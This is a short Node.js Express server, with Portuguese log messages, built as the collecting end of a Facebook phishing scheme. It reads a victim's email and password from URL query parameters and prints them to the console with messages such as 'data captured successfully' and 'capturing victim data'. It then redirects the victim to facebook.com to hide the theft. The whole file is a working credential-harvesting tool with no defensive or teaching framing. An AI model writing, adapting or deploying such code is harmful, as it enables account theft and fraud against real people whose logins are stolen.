const express = require('express');
const app = express();

app.get('/', function(req,res){
	const email = req.query.a;
	const senha = req.query.b;
	console.log('dados capturados com sucesso');
	console.log('EMAIL: ', email);
	console.log('SENHA: ', senha);

	setTimeout(()=>res.redirect('https://facebook.com/'),1500);
});
app.listen(process.env.PORT || 8090);
console.log('Servidor iniciado em http://localhost:8090');
console.log('a capturar dados da vitima...');